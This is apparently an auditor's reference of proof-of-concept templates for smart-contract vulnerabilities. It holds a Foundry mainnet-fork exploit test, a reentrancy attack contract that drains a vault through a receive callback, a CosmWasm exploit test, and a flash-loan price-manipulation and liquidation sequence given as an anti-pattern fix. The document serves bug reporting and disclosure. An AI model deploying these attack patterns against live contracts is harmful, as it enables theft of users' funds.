# PoC Templates & Anti-Patterns

## Contents
- Foundry PoC template
- Attack contract pattern
- Cosmos/Rust PoC template
- Common anti-patterns with fixes

---

## Foundry PoC Template

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @Vulnerability: [One-line description]
// @Impact: [Concrete impact - e.g., "Attacker drains all ETH from vault"]
// @Root Cause: [Why the bug exists]
// @Preconditions: [What must be true]

interface IVulnerableContract {
    // Declare ONLY functions you actually call
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract VulnerabilityPoC is Test {
    IVulnerableContract target;
    address attacker;
    
    address constant TARGET = 0x...; // Real deployed address
    uint256 constant FORK_BLOCK = 12345678;
    
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        target = IVulnerableContract(TARGET);
        attacker = makeAddr("attacker");
        deal(attacker, 1 ether); // Only what's realistically acquirable
    }
    
    function testVulnerabilityExploit() public {
        // --- SNAPSHOT ---
        uint256 vaultBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        // --- EXPLOIT (attacker only, no special roles) ---
        vm.startPrank(attacker);
        // Step 1: [Real contract interaction]
        // Step 2: [Real contract interaction]
        vm.stopPrank();
        
        // --- VERIFY (concrete assertions) ---
        uint256 vaultBalanceAfter = address(target).balance;
        uint256 stolen = attacker.balance - attackerBalanceBefore;
        assertGt(stolen, 0.5 ether, "Attacker profited > 0.5 ETH");
        assertLt(vaultBalanceAfter, vaultBalanceBefore, "Vault lost funds");
    }
}
```

## Attack Contract Pattern (Callbacks)

```solidity
contract AttackContract {
    IVulnerableContract target;
    uint256 reentrancyCount;
    
    constructor(address _target) {
        target = IVulnerableContract(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (reentrancyCount < 5) { // Bounded - no infinite loops
            reentrancyCount++;
            target.withdraw(msg.value);
        }
    }
}
```

## Cosmos/Rust PoC Template

```rust
#[cfg(test)]
mod exploit_tests {
    use super::*;
    use cosmwasm_std::testing::{mock_dependencies, mock_env, mock_info};
    
    /// @Vulnerability: [One-line description]
    /// @Impact: [Concrete impact]
    /// @Root Cause: [Why the bug exists]
    #[test]
    fn test_vulnerability_exploit() {
        let mut deps = mock_dependencies();
        let balance_before = query_balance(&deps, victim_addr);
        
        let attacker = mock_info("attacker", &[]);
        let msg = ExecuteMsg::VulnerableAction { /* params */ };
        let res = execute(deps.as_mut(), mock_env(), attacker, msg).unwrap();
        
        let balance_after = query_balance(&deps, victim_addr);
        assert!(balance_before > balance_after, "Victim lost funds");
        assert_eq!(
            balance_before - balance_after,
            expected_loss,
            "Exact loss amount matches"
        );
    }
}
```

---

## Common Anti-Patterns

### "The Admin Did It"

```solidity
// BAD: Admin creates the exploit condition
vm.prank(admin);
vault.setFeeRecipient(attacker);  // THIS is the vulnerability

// FIX: Show impact AFTER a realistic admin configuration
// Focus on the unexpected capability, not simulating admin action
```

### "The Oracle Whisperer"

```solidity
// BAD
vm.mockCall(oracle, ..., abi.encode(manipulatedPrice));

// FIX: Manipulate price through real on-chain actions
flashLoan.borrow(1000 ether);
router.swap(tokenA, tokenB, 1000 ether); // Moves real pool price
vault.liquidate(victim);
router.swap(tokenB, tokenA, ...);
flashLoan.repay(1000 ether + fee);
```

### "The Assertion Softener"

```solidity
// BAD
assertGt(profit, 0);

// FIX: Derive expected profit from bug mechanics
uint256 inflatedShares = totalSupply / (totalAssets + 1);
uint256 expectedProfit = (inflatedShares * totalAssets) / totalSupply - depositAmount;
assertGe(profit, expectedProfit * 95 / 100, "Profit matches inflation model (5% fee tolerance)");
```

### "The Mock Everything"

```solidity
// BAD: Testing your mocks, not the protocol
vm.mockCall(pool, "getReserves", abi.encode(1000e18, 500e18));
vm.mockCall(oracle, "getPrice", abi.encode(2000e8));
vm.mockCall(token, "balanceOf", abi.encode(100e18));

// FIX: Fork from mainnet. Real contracts, real state.
```

### "The Gas Guzzler"

```solidity
// BAD
for (uint i = 0; i < type(uint256).max; i++) { target.deposit(1 wei); }

// FIX: Calculate minimum iterations, cap explicitly
uint256 iterationsNeeded = targetBalance / minDeposit;
require(iterationsNeeded < 1000, "Too many iterations for mainnet");
for (uint i = 0; i < iterationsNeeded; i++) { target.deposit(minDeposit); }
```
